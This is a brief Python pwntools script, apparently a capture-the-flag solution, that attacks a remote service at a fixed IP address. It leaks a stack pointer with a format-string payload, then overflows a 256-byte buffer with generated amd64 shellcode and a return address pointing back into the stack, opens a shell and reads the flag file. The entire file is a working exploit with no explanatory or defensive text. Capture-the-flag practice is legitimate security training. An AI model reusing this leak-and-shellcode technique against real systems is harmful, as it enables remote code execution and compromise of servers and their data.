#!/usr/bin/env python3
from pwn import *

conn = remote('140.113.207.240',8836)
conn.recvuntil('Wanna get my secret? Come and get it with your payload <3\n')
conn.sendline("%38$p")

old_rbp = conn.recvS()[2:-len("Wanna get my secret? Come and get it with your payload <3\n")]
# offset from old_rsp to rsp 
stack_address = p64(int(old_rbp, 16) - 0x120)

context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.linux.sh())
# padding to 256 byte to fill the buffer and 8 more bytes for rbp
padding  = b"\x00" * (256 - len(shellcode) + 8)


conn.sendline(shellcode + padding + stack_address)
conn.recv()
conn.sendline(b"cat flag")
print (conn.recv())
conn.close()